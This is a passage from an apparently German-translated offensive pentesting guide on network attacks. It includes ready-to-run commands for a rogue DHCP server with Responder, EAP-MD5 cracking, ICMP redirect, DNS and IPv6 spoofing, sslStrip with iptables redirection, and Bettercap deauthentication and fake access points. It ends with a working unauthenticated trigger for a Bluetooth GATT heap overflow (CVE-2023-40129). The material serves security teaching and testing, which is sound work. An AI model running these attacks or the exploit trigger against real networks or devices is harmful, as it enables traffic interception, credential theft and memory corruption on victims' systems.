Du könntest die erwähnten DoS-Angriffe verwenden, um Clients zu zwingen, neue Leases im Umfeld zu erhalten, und legitime Server so zu erschöpfen, dass sie nicht mehr reagieren. Wenn die legitimen Server dann versuchen, sich neu zu verbinden, **kannst du bösartige Werte bereitstellen, die im nächsten Angriff erwähnt werden**.

#### Schädliche Werte setzen

Ein rogue DHCP-Server kann mit dem DHCP-Skript unter `/usr/share/responder/DHCP.py` eingerichtet werden. Das ist nützlich für Netzwerkangriffe, z. B. zum Abgreifen von HTTP-Verkehr und Credentials, indem Traffic zu einem bösartigen Server umgeleitet wird. Das Setzen eines rogue Gateways ist jedoch weniger effektiv, da es nur ausgehenden Traffic vom Client erfasst und die Antworten des echten Gateways verpasst. Stattdessen wird empfohlen, einen rogue DNS- oder WPAD-Server einzurichten, um den Angriff effektiver zu gestalten.

Unten stehen die Kommandooptionen zum Konfigurieren des rogue DHCP-Servers:

- **Our IP Address (Gateway Advertisement)**: Use `-i 10.0.0.100` to advertise your machine's IP as the gateway.
- **Local DNS Domain Name**: Optionally, use `-d example.org` to set a local DNS domain name.
- **Original Router/Gateway IP**: Use `-r 10.0.0.1` to specify the IP address of the legitimate router or gateway.
- **Primary DNS Server IP**: Use `-p 10.0.0.100` to set the IP address of the rogue DNS server you control.
- **Secondary DNS Server IP**: Optionally, use `-s 10.0.0.1` to set a secondary DNS server IP.
- **Netmask of Local Network**: Use `-n 255.255.255.0` to define the netmask for the local network.
- **Interface for DHCP Traffic**: Use `-I eth1` to listen for DHCP traffic on a specific network interface.
- **WPAD Configuration Address**: Use `-w “http://10.0.0.100/wpad.dat”` to set the address for WPAD configuration, assisting in web traffic interception.
- **Spoof Default Gateway IP**: Include `-S` to spoof the default gateway IP address.
- **Respond to All DHCP Requests**: Include `-R` to make the server respond to all DHCP requests, but be aware that this is noisy and can be detected.

Durch korrektes Verwenden dieser Optionen kann ein rogue DHCP-Server eingerichtet werden, um Netzwerkverkehr effektiv abzufangen.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP-Angriffe**

Hier sind einige Angriffstaktiken, die gegen 802.1X-Implementierungen eingesetzt werden können:

- Aktives brute-force Durchprobieren von Passwörtern über EAP
- Angriff auf den RADIUS-Server mit fehlerhaften EAP-Inhalten _\*\*_(exploits)
- Erfassen von EAP-Nachrichten und offline Passwort-Knacken (EAP-MD5 und PEAP)
- Erzwingen der EAP-MD5-Authentifizierung, um die TLS-Zertifikatsvalidierung zu umgehen
- Einspeisen bösartigen Netzwerkverkehrs nach der Authentifizierung über einen Hub oder Ähnliches

Wenn sich der Angreifer zwischen dem Opfer und dem Authentifizierungsserver befindet, könnte er versuchen, das Authentifizierungsprotokoll (falls nötig) auf EAP-MD5 herabzustufen und den Authentifizierungsversuch abzufangen. Dann könnte er dies per brute-force knacken mit:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) ist eine Klasse von Netzwerkprotokollen, die dazu dienen, **ein redundantes, hochverfügbares Routing-System** zu erstellen. Mit FHRP können physische Router zu einem einzigen logischen Gerät zusammengefasst werden, was die Fehlertoleranz erhöht und bei der Lastverteilung hilft.

**Ingenieure von Cisco Systems haben zwei FHRP-Protokolle entwickelt, GLBP und HSRP.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Es sind drei Versionen des Routing Information Protocol (RIP) bekannt: RIP, RIPv2 und RIPng. Bei RIP und RIPv2 werden Datagramme über UDP an Port 520 an Peers gesendet, während RIPng Datagramme über IPv6-Multicast an UDP-Port 521 broadcastet. RIPv2 führte Unterstützung für MD5-Authentifizierung ein. RIPng hingegen enthält keine native Authentifizierung und verlässt sich stattdessen auf optionale IPsec AH- und ESP-Header innerhalb von IPv6.

- **RIP und RIPv2:** Die Kommunikation erfolgt über UDP-Datagramme auf Port 520.
- **RIPng:** Nutzt UDP-Port 521, um Datagramme via IPv6-Multicast zu broadcasten.

Beachte, dass RIPv2 MD5-Authentifizierung unterstützt, während RIPng keine native Authentifizierung beinhaltet und auf IPsec AH- und ESP-Header in IPv6 angewiesen ist.

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)** ist ein dynamisches Routing-Protokoll. **Es ist ein Distance-Vector-Protokoll.** Wenn keine Authentifizierung und keine Konfiguration passiver Interfaces vorhanden ist, kann ein **Angreifer** in das EIGRP-Routing eingreifen und eine **Routing-Tabellen-Vergiftung** verursachen. Außerdem ist ein EIGRP-Netzwerk (also das autonome System) **flach und nicht in Zonen segmentiert**. Wenn ein **Angreifer eine Route injiziert**, ist es wahrscheinlich, dass sich diese Route im gesamten autonomen EIGRP-System **ausbreitet**.

Um ein EIGRP-System anzugreifen, ist es erforderlich, **eine Nachbarschaft mit einem legitimen EIGRP-Router** herzustellen, was viele Möglichkeiten eröffnet, von grundlegender Aufklärung bis hin zu verschiedenen Injektionen.

[**FRRouting**](https://frrouting.org/) ermöglicht es, **einen virtuellen Router zu betreiben, der BGP, OSPF, EIGRP, RIP und andere Protokolle unterstützt.** Alles, was Sie tun müssen, ist, ihn auf dem System des Angreifers bereitzustellen, und Sie können sich tatsächlich als legitimer Router in der Routing-Domäne ausgeben.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) verfügt über Möglichkeiten, EIGRP-Broadcasts abzufangen. Es erlaubt auch die Injektion von Paketen, die verwendet werden können, um Routing-Konfigurationen zu verändern.

### OSPF

Im Open Shortest Path First (OSPF)-Protokoll wird **MD5-Authentifizierung häufig verwendet, um die Kommunikation zwischen Routern zu sichern**. Diese Sicherheitsmaßnahme kann jedoch mit Werkzeugen wie Loki und John the Ripper kompromittiert werden. Diese Tools sind in der Lage, MD5-Hashes zu erfassen und zu knacken, wodurch der Authentifizierungsschlüssel offengelegt wird. Sobald dieser Schlüssel erlangt ist, kann er verwendet werden, um neue Routing-Informationen einzuführen. Zur Konfiguration der Routenparameter und zum Setzen des kompromittierten Schlüssels werden jeweils die _Injection_- und _Connection_-Tabs verwendet.

- **Erfassen und Knacken von MD5-Hashes:** Dafür werden Tools wie Loki und John the Ripper verwendet.
- **Konfiguration der Routenparameter:** Erfolgt über den _Injection_-Tab.
- **Setzen des kompromittierten Schlüssels:** Der Schlüssel wird im _Connection_-Tab konfiguriert.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): Tool zum Scannen von Netzwerkverkehr und Auffinden von Schwachstellen
- Sie finden einige **more information about network attacks** [**here**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

Der Angreifer konfiguriert alle Netzwerkparameter (GW, IP, DNS) des neuen Mitglieds im Netzwerk, indem er gefälschte DHCP-Antworten sendet.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Siehe [previous section](#arp-spoofing).

### ICMPRedirect

ICMP Redirect besteht darin, ein ICMP packet type 1 code 5 zu senden, das anzeigt, dass der attacker der beste Weg ist, um eine IP zu erreichen. Wenn die victim die IP kontaktieren möchte, sendet sie das packet dann über den attacker.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

Der Angreifer löst einige (oder alle) Domains auf, die das Opfer anfragt.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Eigene DNS mit dnsmasq konfigurieren**
```bash
apt-get install dnsmasq
echo "addn-hosts=dnsmasq.hosts" > dnsmasq.conf
echo "127.0.0.1   domain.example.com" > dnsmasq.hosts
sudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Lokale Gateways

Mehrere Routen zu Systemen und Netzwerken existieren oft. Nachdem Sie eine Liste von MAC-Adressen im lokalen Netzwerk erstellt haben, verwenden Sie _gateway-finder.py_, um Hosts zu identifizieren, die IPv4 forwarding unterstützen.

<details>
<summary>gateway-finder Nutzungsbeispiel</summary>
```bash
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
</details>


### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Für die lokale Host-Auflösung, wenn DNS-Abfragen fehlschlagen, verlassen sich Microsoft-Systeme auf **Link-Local Multicast Name Resolution (LLMNR)** und den **NetBIOS Name Service (NBT-NS)**. Ebenso nutzen **Apple Bonjour** und **Linux zero-configuration**-Implementierungen **Multicast DNS (mDNS)**, um Systeme im Netzwerk zu entdecken. Aufgrund der nicht authentifizierten Natur dieser Protokolle und ihrer Funktionsweise über UDP‑Broadcasts können sie von Angreifern ausgenutzt werden, die Benutzer auf bösartige Dienste umleiten wollen.

Sie können Dienste, nach denen Hosts suchen, mit Responder vortäuschen, indem Sie gefälschte Antworten senden.\
Weitere Informationen dazu: [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Browser verwenden häufig das **Web Proxy Auto-Discovery (WPAD) Protokoll**, um Proxy-Einstellungen automatisch zu beziehen. Dabei werden Konfigurationsdaten von einem Server abgerufen, typischerweise über eine URL wie "http://wpad.example.org/wpad.dat". Die Entdeckung dieses Servers durch Clients kann auf verschiedenen Wegen erfolgen:

- Über **DHCP**, wobei die Entdeckung durch die Verwendung eines speziellen Code-252-Eintrags ermöglicht wird.
- Über **DNS**, wobei nach einem Hostnamen mit der Bezeichnung _wpad_ innerhalb der lokalen Domain gesucht wird.
- Über **Microsoft LLMNR und NBT-NS**, die als Fallback-Mechanismen verwendet werden, wenn DNS-Abfragen fehlschlagen.

Das Tool Responder nutzt dieses Protokoll aus, indem es als **malicious WPAD server** auftritt. Es verwendet DHCP, DNS, LLMNR und NBT-NS, um Clients dazu zu bringen, sich damit zu verbinden. Mehr dazu: [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Sie können im Netzwerk verschiedene Dienste anbieten, um **einen Benutzer zu täuschen**, damit er einige **plain-text credentials** eingibt. **Weitere Informationen zu diesem Angriff in** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

Dieser Angriff ist dem ARP Spoofing sehr ähnlich, aber in der IPv6‑Welt. Sie können das Opfer dazu bringen zu glauben, dass die IPv6-Adresse des GW die MAC-Adresse des Angreifers hat.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Einige OS konfigurieren standardmäßig das Gateway anhand der im Netzwerk gesendeten RA packets. Um den Angreifer als IPv6-Router zu deklarieren, können Sie Folgendes verwenden:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Standardmäßig versuchen einige OS, den DNS zu konfigurieren, indem sie ein DHCPv6-Paket im Netzwerk auslesen. Dann könnte ein attacker ein DHCPv6-Paket senden, um sich selbst als DNS zu konfigurieren. Der DHCP stellt dem victim außerdem eine IPv6-Adresse zur Verfügung.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (Fake-Seite und JS code injection)

## Internet-Angriffe

### sslStrip

Grundsätzlich funktioniert dieser Angriff so: Falls der **user** versucht, eine **HTTP**-Seite zu **access**, die auf die **HTTPS**-Version **redirecting**.

**sslStrip** wird **maintain** eine **HTTP connection with** dem **client and** eine **HTTPS connection with** dem **server**, sodass es in der Lage sein wird, die Verbindung im **plain text** zu **sniff**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Mehr Infos [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy zum Umgehen von HSTS

Der **Unterschied** zwischen **sslStrip+ and dns2proxy** gegenüber **sslStrip** ist, dass sie zum Beispiel _**www.facebook.com**_ **auf** _**wwww.facebook.com**_ umleiten (achte auf das **zusätzliche** "**w**") und die **Adresse dieser Domain als Angreifer-IP setzen**. Auf diese Weise wird der **Client** sich mit _**wwww.facebook.com**_ **(dem Angreifer)** **verbinden**, während hinter den Kulissen **sslstrip+** die **echte Verbindung** per HTTPS zu **www.facebook.com** **aufrechterhält**.

Das **Ziel** dieser Technik ist es, **HSTS zu umgehen**, weil _**wwww**.facebook.com_ **nicht** im **Cache** des Browsers gespeichert wird, sodass der Browser dazu verleitet wird, die **Facebook-Authentifizierung über HTTP** durchzuführen.\  
Beachte, dass für diesen Angriff das Opfer anfangs versuchen muss, [http://www.faceook.com](http://www.faceook.com) (nicht https) aufzurufen. Das kann erreicht werden, indem Links innerhalb einer http-Seite geändert werden.

Mehr Infos [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) und [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip oder sslStrip+ funktionieren nicht mehr. Das liegt daran, dass HSTS-Regeln bereits im Browser vorab gespeichert sind, sodass ein Benutzer selbst beim ersten Zugriff auf eine „wichtige“ Domain diese per HTTPS erreicht. Beachte außerdem, dass die vorkonfigurierten Regeln und andere erzeugte Regeln das Flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **verwenden können, sodass das zuvor genannte Beispiel _**wwww.facebook.com**_ nicht mehr funktioniert, da _**facebook.com**_ HSTS mit `includeSubdomains` verwendet.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP auf Port lauschen
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL auf Port lauschen

#### Schlüssel und selbstsigniertes Zertifikat erzeugen
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Mit Zertifikat lauschen
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Mit Zertifikat lauschen und an die Hosts weiterleiten
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Manchmal, wenn der Client überprüft, dass die CA gültig ist, könntest du **serve a certificate of other hostname signed by a CA**.\
Ein weiterer interessanter Test ist, eine c**ertificate of the requested hostname but self-signed** bereitzustellen.

Weitere Tests bestehen darin, zu versuchen, das certificate mit einem valid certificate zu signieren, das selbst keine gültige CA ist. Oder den valid public key zu verwenden und zu erzwingen, dass ein Algorithmus wie diffie hellman verwendet wird (einer, der nichts mit dem echten private key entschlüsseln muss). Wenn der Client dann eine probe des echten private key anfordert (z. B. einen hash), sendet man eine gefälschte probe und erwartet, dass der Client dies nicht prüft.

## Bettercap

<details>
<summary>Gängige Bettercap-Befehle</summary>
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
</details>


### Aktive Discovery-Hinweise

Beachte, dass wenn ein UDP-Paket an ein Gerät gesendet wird, das den angeforderten Port nicht hat, ein ICMP (Port Unreachable) zurückgesendet wird.

### **ARP discover**

ARP-Pakete werden verwendet, um herauszufinden, welche IP-Adressen im Netzwerk genutzt werden. Der PC muss für jede mögliche IP-Adresse eine Anfrage senden; nur die tatsächlich genutzten Adressen antworten.

### **mDNS (multicast DNS)**

Bettercap sendet eine MDNS-Anfrage (alle X ms) für **\_services\_.dns-sd.\_udp.local**; die Maschine, die dieses Paket sieht, antwortet normalerweise auf diese Anfrage. Anschließend sucht es nur nach Maschinen, die auf "services" antworten.

**Tools**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap sendet Broadcast-Pakete an Port 137/UDP und fragt nach dem Namen "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap sendet SSDP-Broadcast-Pakete und sucht nach allen Arten von Services (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap sendet WSD-Broadcast-Pakete und sucht nach Services (UDP Port 3702).


## Bluetooth (L2CAP/ATT/GATT) Attacks

- Android Fluoride exposes services over L2CAP PSMs (e.g., SDP 0x0001, RFCOMM 0x0003, BNEP 0x000F, AVCTP 0x0017/0x001B, AVDTP 0x0019, ATT/GATT 0x001F). Services werden registriert über:
```c
uint16_t L2CA_Register2(uint16_t psm, const tL2CAP_APPL_INFO& p_cb_info,
bool enable_snoop, tL2CAP_ERTM_INFO* p_ertm_info,
uint16_t my_mtu, uint16_t required_remote_mtu,
uint16_t sec_level);
```
- BlueBlue framework ermöglicht Scapy-based L2CAP/ATT crafting (auf BlueBorne l2cap_infra aufgebaut). Beispiel:
```python
acl  = ACLConnection(src_bdaddr, dst_bdaddr, auth_mode='justworks')
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=672)
gatt.send_frag(p8(GATT_READ)+p16(1234))
print(gatt.recv())
```
- CVE-2023-40129 (Fluoride GATT): integer underflow im Read Multiple Variable response builder kann einen ~64KB heap overflow verursachen, wenn die MTU ein variable-length element abschneidet, aber das +2 length field nicht berücksichtigt wird.

<details>
<summary>Ursache (GATT Read Multiple Variable)</summary>
```c
static void build_read_multi_rsp(tGATT_SR_CMD* p_cmd, uint16_t mtu) {
uint16_t ii, total_len, len; uint8_t* p; bool is_overflow=false;
len = sizeof(BT_HDR) + L2CAP_MIN_OFFSET + mtu;
BT_HDR* p_buf = (BT_HDR*)osi_calloc(len); p_buf->offset=L2CAP_MIN_OFFSET;
p = (uint8_t*)(p_buf + 1) + p_buf->offset; *p++ = GATT_RSP_READ_MULTI_VAR;
p_buf->len=1;
for (ii=0; ii<p_cmd->multi_req.num_handles; ii++) {
tGATTS_RSP* p_rsp = ...; // dequeued
if (p_rsp) {
total_len = (p_buf->len + p_rsp->attr_value.len);
if (p_cmd->multi_req.variable_len) total_len += 2;
if (total_len > mtu) {
len = p_rsp->attr_value.len - (total_len - mtu); // BUG: ignores +2
is_overflow = true;
} else { len = p_rsp->attr_value.len; }
if (p_cmd->multi_req.variable_len) { UINT16_TO_STREAM(p, len); p_buf->len += 2; }
memcpy(p, p_rsp->attr_value.value, len); // heap overflow
if (!is_overflow) p += len; p_buf->len += len; if (is_overflow) break;
}
}
}
```
- Bei variablen Längeneinträgen subtrahiert der Overflow-Pfad nur (total_len - mtu), wobei das +2-Längenfeld ignoriert wird, sodass len unterläuft (z. B. 0xFFFE) und memcpy ~64KB über das Ende des Buffers hinaus schreibt.
</details>

- Minimaler unauthentifizierter Trigger (kleines MTU erzwingt Unterlauf beim 4. Attribut):
```python
# GATT_REQ_READ_MULTI_VAR (0x20), MTU=55
acl  = ACLConnection(interface, bdaddr)
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=55)
pkt  = b'\x20'  # opcode
pkt += p16(9); pkt += p16(9); pkt += p16(9); pkt += p16(9)
gatt.send(pkt)
# On 4th insert: p_buf->len=55 (1 + 3*(16+2)), total_len=73 -> len=16-(73-55)=-2 -> ~64KB overwrite
```
### Telecom / Mobile-Core (GTP) Exploitation


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## Referenzen

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Paint it blue: Attacking the bluetooth stack (Synacktiv)](https://www.synacktiv.com/en/publications/paint-it-blue-attacking-the-bluetooth-stack)
- [BlueBorne L2CAP testing infra (l2cap_infra)](https://github.com/ArmisSecurity/blueborne/tree/master/l2cap_infra)



{{#include ../../banners/hacktricks-training.md}}
